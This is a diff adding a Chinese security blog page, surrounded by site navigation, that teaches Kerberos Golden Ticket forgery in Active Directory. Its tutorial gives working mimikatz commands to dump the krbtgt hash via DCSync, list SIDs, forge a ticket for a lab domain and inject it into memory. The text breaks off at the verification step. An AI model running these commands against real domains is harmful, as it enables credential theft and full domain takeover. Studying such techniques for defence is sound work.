@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    
+    <title>【5】黄金票据和白银票据 | wintrysec</title>
+    
+    
+        <meta name="keywords" content="【5】黄金票据和白银票据" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="黄金票据（Golden Ticket） 黄金票据：即伪造的TGT票据，当攻击者拥有了高权限的TGT，就可以发送给KDC的TGS 换取任意Server的票据（ST）。 有了金票就有了当前域内的最高控制权限。  金票的利用原理是直接跳过了KDC的AS认证过程（AS-REQ、AS-REP通信）。 由于黄金票据是伪造的TGT，它作为TGS-REQ的一部分被发送到KDC的TGS，以获取服务票据ST。 伪造的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【5】黄金票据和白银票据">
+<meta property="og:url" content="https://wintrysec.github.io/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%906%E3%80%91%E5%9F%9F%E6%B8%97%E9%80%8F/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/index.html">
+<meta property="og:site_name" content="wintrysec">
+<meta property="og:description" content="黄金票据（Golden Ticket） 黄金票据：即伪造的TGT票据，当攻击者拥有了高权限的TGT，就可以发送给KDC的TGS 换取任意Server的票据（ST）。 有了金票就有了当前域内的最高控制权限。  金票的利用原理是直接跳过了KDC的AS认证过程（AS-REQ、AS-REP通信）。 由于黄金票据是伪造的TGT，它作为TGS-REQ的一部分被发送到KDC的TGS，以获取服务票据ST。 伪造的">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-04-28T14:03:31.268Z">
+<meta property="article:modified_time" content="2020-12-01T13:11:02.000Z">
+<meta property="article:author" content="wintrysec">
+<meta name="twitter:card" content="summary">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="wintrysec" type="application/atom+xml" />
+    
+
+    
+        <link rel="icon" href="/favicon.ico" />
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/open-sans/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    
+<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">wintrysec</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/about">关于</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/about">关于</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id='categories'>
+        <h3 class="widget-title">
+            <span>categories</span>
+            &nbsp;
+            <a id='allExpand' href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【0】基础知识
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E5%B8%B8%E8%AF%86/">【0】网络安全设备常识</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/">【1】现代密码学常识</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/2%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BWeb%E5%8A%9F%E8%83%BD/">【2 网络基础】Web应用常识</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BTCP&IP/">【3 网络基础】TCP/IP协议</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/4%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BHTTP/">【4 网络基础】HTTP协议</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/5%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BSSL%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/">【5 网络基础】SSL双向认证</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/6%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/">【6 网络基础】路由协议</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8BLinux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/">【7 操作系统】Linux基础命令</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8BLinux%E4%B8%89%E5%89%91%E5%AE%A2/">【8 操作系统】Linux三剑客</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【1】Web安全
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/01/22/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/">未授权访问总结</a></li>  <li class="file"><a href="/2020/01/22/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">信息泄露漏洞</a></li>  <li class="file"><a href="/2020/01/22/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a></li>  <li class="file"><a href="/2020/01/22/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">文件包含漏洞</a></li>  <li class="file"><a href="/2020/01/22/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">命令注入漏洞</a></li>  <li class="file"><a href="/2020/01/22/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E5%B8%B8%E8%A7%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">常见逻辑漏洞</a></li>  <li class="file"><a href="/2020/01/22/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/">请求伪造漏洞</a></li>  <li class="file"><a href="/2020/01/22/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E5%9F%9F%E5%AE%89%E5%85%A8/">同源策略和域安全</a></li>  <li class="file"><a href="/2020/01/22/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">XSS 跨站脚本漏洞</a></li>  <li class="file"><a href="/2020/01/22/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">XML实体注入漏洞</a></li>  <li class="file"><a href="/2020/01/22/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">SQL注入漏洞</a></li>  <li class="file"><a href="/2020/01/22/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/MySQL%E5%86%99shell/">MySQL写shell</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【2】工具手册
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/04/28/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/Metasploit/">Metasploit漏洞利用框架</a></li>  <li class="file"><a href="/2021/04/28/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C%E4%B9%8BBurpSuite/">BurpSuite简要手册</a></li>  <li class="file"><a href="/2021/04/28/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C%E4%B9%8BNmap/">nmap端口扫描</a></li>  <li class="file"><a href="/2021/04/28/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C%E4%B9%8Bsqlmap%E5%A4%87%E5%BF%98/">sqlmap简要手册</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            【3】攻防对抗
+                        </a>
+                         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【1】边界资产信息收集和打点
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%901%E3%80%91%E8%BE%B9%E7%95%8C%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%92%8C%E6%89%93%E7%82%B9/%E8%BE%B9%E7%95%8C%E6%89%93%E7%82%B9/">边界资产信息收集和打点</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【2】构建通道
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%902%E3%80%91%E6%9E%84%E5%BB%BA%E9%80%9A%E9%81%93/%E6%9E%84%E5%BB%BA%E9%80%9A%E9%81%93/">构建通道漫游内网</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【3】权限维持
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%903%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">权限提升</a></li>  <li class="file"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%903%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">权限维持</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【4】横向移动
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%904%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%8A%80%E5%B7%A7/">内网横向移动技巧</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【5】日志处理
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%905%E3%80%91%E6%97%A5%E5%BF%97%E5%A4%84%E7%90%86/%E6%97%A5%E5%BF%97%E5%A4%84%E7%90%86/">日志处理</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            【6】域渗透
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%906%E3%80%91%E5%9F%9F%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%9F%BA%E7%A1%80/">域环境基础</a></li>  <li class="file"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%906%E3%80%91%E5%9F%9F%E6%B8%97%E9%80%8F/Hash%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/">【3】Hash传递攻击</a></li>  <li class="file"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%906%E3%80%91%E5%9F%9F%E6%B8%97%E9%80%8F/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"></a></li>  <li class="file"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%906%E3%80%91%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF/">【6】指定主机上线</a></li>  <li class="file active"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%906%E3%80%91%E5%9F%9F%E6%B8%97%E9%80%8F/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/">【5】黄金票据和白银票据</a></li>  <li class="file"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%906%E3%80%91%E5%9F%9F%E6%B8%97%E9%80%8F/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/">【4】票据传递攻击</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【7 蓝队】防守策略
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%907%20%E8%93%9D%E9%98%9F%E3%80%91%E9%98%B2%E5%AE%88%E7%AD%96%E7%95%A5/%E3%80%90%E8%93%9D%E9%98%9F%E3%80%91%E9%98%B2%E5%AE%88%E7%AD%96%E7%95%A5/">【蓝队】2020攻防演练防守心得</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【8 蓝队】基线加固
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/08/12/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%908%20%E8%93%9D%E9%98%9F%E3%80%91%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/Linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">Linux安全加固</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%908%20%E8%93%9D%E9%98%9F%E3%80%91%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/Windows%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">Windows安全加固</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%908%20%E8%93%9D%E9%98%9F%E3%80%91%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">数据库安全加固</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【9 蓝队】应急响应
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/08/12/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%909%20%E8%93%9D%E9%98%9F%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应模型</a></li>  <li class="file"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%909%20%E8%93%9D%E9%98%9F%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">Linux入侵排查</a></li>  <li class="file"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%909%20%E8%93%9D%E9%98%9F%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Webshell%E6%8E%92%E6%9F%A5/">Webshell排查</a></li>  <li class="file"><a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%909%20%E8%93%9D%E9%98%9F%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">Windows入侵排查</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【4】渗透测试
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/04/28/%E3%80%904%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CheckList/">渗透测试CheckList</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-【3】攻防对抗/【6】域渗透/黄金票据和白银票据" class="article article-type-post" itemscope itemprop="blogPost">
+    
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/">【3】攻防对抗</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%906%E3%80%91%E5%9F%9F%E6%B8%97%E9%80%8F/">【6】域渗透</a>
+    </div>
+
+                        
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2021/04/28/%E3%80%903%E3%80%91%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/%E3%80%906%E3%80%91%E5%9F%9F%E6%B8%97%E9%80%8F/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/">
+            <time datetime="2021-04-28T14:03:31.268Z" itemprop="datePublished">2021-04-28</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            【5】黄金票据和白银票据
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            <div id="toc" class="toc-article">
+                <!-- <strong class="toc-title">文章目录</strong> -->
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#黄金票据（Golden-Ticket）"><span class="toc-text">黄金票据（Golden Ticket）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#白银票据-（Silver-Ticket）"><span class="toc-text">白银票据 （Silver Ticket）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#黄金票据和白银票据的不同"><span class="toc-text">黄金票据和白银票据的不同</span></a></li></ol>
+                </div>
+            
+        
+        
+            <h2 id="黄金票据（Golden-Ticket）"><a href="#黄金票据（Golden-Ticket）" class="headerlink" title="黄金票据（Golden Ticket）"></a>黄金票据（Golden Ticket）</h2><blockquote>
+<p>黄金票据：即伪造的<code>TGT</code>票据，当攻击者拥有了高权限的TGT，就可以发送给KDC的TGS 换取<code>任意Server</code>的票据（ST）。</p>
+<p>有了金票就有了当前域内的最高控制权限。</p>
+</blockquote>
+<p>金票的<strong>利用原理</strong>是直接跳过了KDC的AS认证过程（AS-REQ、AS-REP通信）。</p>
+<p>由于黄金票据是伪造的TGT，它作为TGS-REQ的一部分被发送到KDC的TGS，以获取服务票据ST。</p>
+<p>伪造的黄金票据是 有效的TGT票据，因为它是由域账号<code>krbtgt</code>的<code>NTLM Hash</code>加密和签名的。</p>
+<p>TGT用于向KDC的TGS服务证明Client已经过AS认证，TGT可以被该域内的任何KDC服务器解密。</p>
+<p><strong>1、导出<code>krbtgt</code>的<code>NTML Hash</code></strong></p>
+<p>域管理员权限运行mimikatz（或其它域主机的本地管理员账号密码和域控相同也行）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"lsadump::dcsync /user:krbtgt"</span> <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#MSF中的hashdump也可以</span></span><br><span class="line">meterpreter&gt; hashdump</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、获取域中所有用户SID</strong></p>
+<p>应用的时候，去掉SID最后的数字</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#只要是域用户权限就行</span></span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、制造黄金票据</strong></p>
+<p><strong>（1）清空现有票据</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"kerberos::purge"</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）生成票据</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"kerberos::golden /admin:Administrator /domain:wintrysec.lab /sid:S-1-5-21-1160434164-3042164129-2463410311 /krbtgt:a8424e3f13e1253ea732a5245f2f4266 /ticket:Administrator.kiribi"</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>4、将票据注入内存</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"kerberos::ptt Administrator.kiribi"</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>5、检索当前会话中的票据</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"kerberos::tgt"</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>6、权限验证</strong></p>
+<p>列出域控的C盘</p>
